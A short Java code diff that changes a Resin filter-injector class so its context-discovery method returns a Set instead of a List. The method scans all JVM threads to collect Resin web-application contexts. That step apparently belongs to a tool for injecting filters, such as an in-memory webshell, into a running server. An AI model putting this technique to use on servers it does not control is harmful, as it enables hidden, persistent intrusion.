@@ -29,7 +29,7 @@ public class ResinFilterInjector {
     }
 
     public ResinFilterInjector() {
-        List<Object> contexts = null;
+        Set<Object> contexts = null;
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
@@ -71,7 +71,7 @@ public class ResinFilterInjector {
      * com.caucho.server.webapp.Application
      * /usr/local/resin3/lib/resin.jar
      */
-    public List<Object> getContext() throws Exception {
+    public Set<Object> getContext() throws Exception {
         Set<Object> contexts = new HashSet<Object>();
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
@@ -87,7 +87,7 @@ public class ResinFilterInjector {
                 contexts.add(webApp);
             }
         }
-        return Arrays.asList(contexts.toArray());
+        return contexts;
     }
 
     public ClassLoader getWebAppClassLoader(Object context) throws Exception {
